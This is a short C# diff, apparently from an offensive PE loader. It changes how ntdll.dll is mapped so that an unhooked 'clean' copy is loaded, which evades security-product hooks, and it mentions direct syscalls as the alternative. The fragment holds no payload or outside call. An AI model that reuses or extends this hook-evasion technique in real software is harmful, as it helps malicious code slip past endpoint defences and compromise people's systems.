@@ -295,7 +295,7 @@ if (string.IsNullOrEmpty(url) && string.IsNullOrEmpty(PE_b64) && string.IsNullOr
 PE_MANUAL_MAP ntdll = new();
 if (!useSysCalls)
 {
-    ntdll = Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");
+    ntdll = Map.MapModuleFromDisk(@"C:\Windows\System32\ntdll.dll"); /* Replaced Map.MapModuleToMemory with Map.MapModuleFromDisk to make it work with x32 */
     Console.WriteLine("[*] Mapped a clean version of ntdll (no hooks here)");
 }
 else { print("[*] using SysCalls, Will Not Map ntdll"); }
